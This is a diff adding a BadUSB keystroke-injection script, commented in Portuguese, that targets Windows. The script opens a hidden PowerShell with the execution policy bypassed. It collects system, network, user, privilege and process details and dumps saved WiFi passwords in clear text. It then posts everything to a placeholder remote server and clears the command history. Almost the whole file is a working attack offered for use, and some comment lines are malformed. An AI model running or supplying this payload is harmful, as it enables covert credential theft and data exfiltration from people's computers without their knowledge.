@@ -1,0 +1,49 @@
+REM =================================================================
+REM Ataque BadUSB - Reconhecimento Windows Completo
+REM =================================================================
+REM
+REM Descrição: Script BadUSB para coleta completa de informações do
+REM sistema Windows, incluindo rede, usuários, processos e senhas.
+REM
+ Quando usar: Para mapear sistemas Windows e identificar pontos de
+REM entrada e privilégios de acesso.
+REM
+ Como usar: Conectar o dispositivo BadUSB e o script será executado
+REM automaticamente.
+REM
+ Observações: Re privilégios de administrador para acesso completo.
+REM Modifique os comandos conforme necessário.
+REM
+=================================================================
+
+DELAY 1000
+
+Abre o PowerShell em modo oculto
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+ENTER
+DELAY 1000
+
+Coleta informações completas do sistema
+STRING $output = "=== RECONHECIMENTO COMPLETO DO SISTEMA ===`n`n"; $output += "=== Informações Básicas ===`n"; $output += "Computador: $env:COMPUTERNAME`n"; $output += "Usuário: $env:USERNAME`n"; $output += "Domínio: $env:USERDOMAIN`n"; $output += "Sistema: $(Get-CimInstance Win32_OperatingSystem | Select-Object -ExpandProperty Caption)`n`n"; $output += "=== Rede ===`n"; $output += "IP: $(Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike '*Loopback*'} | Select-Object -ExpandProperty IPAddress)`n"; $output += "MAC: $(Get-NetAdapter | Where-Object {$_.Status -eq 'Up'} | Select-Object -ExpandProperty MacAddress)`n`n"; $output += "=== Privilégios ===`n"; $output += "Administrador: $([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)`n`n"; $output += "=== Processos Ativos ===`n"; $output += "$(Get-Process | Select-Object ProcessName, Id, CPU | Sort-Object CPU -Descending | Select-Object -First 10)`n`n"; $output += "=== Senhas Salvas (se houver) ===`n"; $output += "WiFi: $(netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() } | ForEach-Object { netsh wlan show profile name="$_" key=clear | Select-String "Key Content" })`n`n"; $output += "=== Arquivos Recentes ===`n"; $output += "$(Get-ChildItem -Path $env:USERPROFILE\Recent -Name | Select-Object -First 10)`n`n"; $output += "=== Serviços Críticos ===`n"; $output += "$(Get-Service | Where-Object {$_.Status -eq 'Running'} | Select-Object Name, DisplayName | Sort-Object Name)`n`n"; $output += "Data: $(Get-Date)`n"
+
+ENTER
+
+Salva as informações em arquivo
+STRING $output | Out-File -FilePath "$env:TEMP\recon_completo.txt" -Encoding ASCII
+
+ENTER
+
+Envia as informações para servidor remoto
+STRING $url = "https://seu-servidor.com/recon"; $body = @{data=$output; computer=$env:COMPUTERNAME; user=$env:USERNAME} | ConvertTo-Json; Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/json"
+
+ENTER
+
+Abre o arquivo para visualização
+STRING notepad "$env:TEMP\recon_completo.txt"
+ENTER
+
+Limpa o histórico
+STRING Clear-History
+ENTER
